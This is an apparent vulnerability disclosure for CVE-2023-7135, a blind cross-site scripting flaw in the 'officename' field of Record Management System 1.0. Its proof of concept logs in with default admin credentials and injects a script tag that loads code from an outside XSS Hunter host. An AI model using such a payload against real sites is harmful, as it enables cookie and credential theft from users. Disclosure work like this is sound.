# CVE-2023-7135_Record_Management_System-Blind_Cross_Site_Scripting-1
+ **Exploit Title:** CVE-2023-7135_Record_Management_System-Blind_Cross_Site_Scripting-1
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/record-management-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/RECORD_MANAGEMENT_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7135

## References: 
+ **CVE-2023-7135:** https://vuldb.com/?id.249138
+ https://www.cve.org/CVERecord?id=CVE-2023-7135
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-7135

## Description:
Record Management System 1.0 allows Blind Cross-Site Scripting via parameter 'officename' in "/recordmanagement/main/offices.php". Record Management System is vulnerable to a blind cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to the login panel: "http://localhost/recordmanagement/"
+ Login with `admin`:`admin`
+ Go to the Offices: "http://localhost/recordmanagement/main/offices.php"
+ Then go to the xsshunter app on https://xsshunter.trufflesecurity.com and login.
+ XSS PAYLOADS -> Copy Payload "Basic <script> Tag Payload"
+ Add Office and Name with payload `"><script src="https://js.rip/b23tmbxf49"></script>`
+ Save and then go to XSS PAYLOAD FIRES on the xsshunter.
+ Check Reports.

![3-1](https://github.com/h4md153v63n/CVEs/assets/5091265/1a7010d1-375b-4057-887c-f5b77d7b7fc8)
<br>
<br>
![3-2](https://github.com/h4md153v63n/CVEs/assets/5091265/8ef95f72-c0e4-4dfe-9888-019f74f761a2)
<br>
<br>
![3-3](https://github.com/h4md153v63n/CVEs/assets/5091265/b83ac262-e5b3-4767-931d-06c5baf08efe)
<br>
<br>
![3-4](https://github.com/h4md153v63n/CVEs/assets/5091265/92faa150-3a3c-47c1-a053-033cd70782b6)
<br>
<br>
![3-5](https://github.com/h4md153v63n/CVEs/assets/5091265/0546b16c-44bf-461a-afb0-b128ccde253c)
<br>
<br>
![3-6](https://github.com/h4md153v63n/CVEs/assets/5091265/5110ae7e-b43d-4a1a-a962-84f5c32d6999)
